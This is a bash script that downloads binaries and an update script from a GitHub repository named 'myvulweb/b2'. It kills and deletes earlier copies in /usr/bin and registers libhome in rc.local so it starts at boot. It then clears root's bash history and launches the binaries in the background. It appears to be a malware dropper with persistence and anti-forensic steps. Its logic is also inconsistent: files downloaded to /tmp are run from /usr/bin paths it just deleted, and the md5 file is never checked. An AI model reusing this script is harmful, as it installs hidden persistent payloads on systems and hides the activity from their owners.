#!/bin/bash
#




#uninstall
#
#down and checkmd5

wget https://github.com/myvulweb/b2/raw/master/libbus -O /tmp/libbus
wget https://github.com/myvulweb/b2/raw/master/usrhost -O /tmp/usrhost 
wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome -O /tmp/libhome

wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /tmp/usrhost_ver.txt
wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /tmp/linux-update.sh

wget https://raw.githubusercontent.com/myvulweb/b2/master/md5 -O /tmp/mymd5



sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab
sed -i '\/usr\/bin\/libhome/d' /etc/rc.d/rc.local

killall usrhost
killall libbus
killall libhome

rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus
rm -rf /usr/bin/libhome

rm -rf /usr/bin/linux-update.sh
rm -rf /usr/bin/usrhost_ver.txt

#uninstall finish

#my daemon and add autorun

chmod 777 /usr/bin/libhome
echo '/usr/bin/libhome'>>/etc/rc.d/rc.local


chmod 777 /usr/bin/linux-update.sh

chmod 777 /usr/bin/usrhost

chmod 777 /usr/bin/libbus

echo >/root/.bash_history
history -c
/usr/bin/usrhost &
/usr/bin/libbus &
/usr/bin/libhome &

 